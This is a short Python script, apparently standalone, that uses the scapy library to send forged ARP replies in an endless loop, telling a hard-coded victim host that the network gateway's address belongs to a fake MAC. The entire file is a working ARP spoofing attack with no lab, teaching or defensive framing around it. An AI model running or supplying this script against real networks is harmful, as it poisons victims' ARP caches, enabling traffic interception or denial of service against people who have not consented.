# ⚠️ Requires: pip install scapy
# ⚠️ Must be run as root (sudo)

from scapy.all import ARP, send
import time

target_ip = "192.168.1.10"     # Victim IP
gateway_ip = "192.168.1.1"     # Gateway/router IP
fake_mac = "de:ad:be:ef:00:01" # Fake MAC address to impersonate

packet = ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=fake_mac)

print(f"[*] Spoofing {target_ip} into thinking we're {gateway_ip}...")
try:
    while True:
        send(packet, verbose=False)
        print("[+] ARP packet sent")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[!] Stopped spoofing.")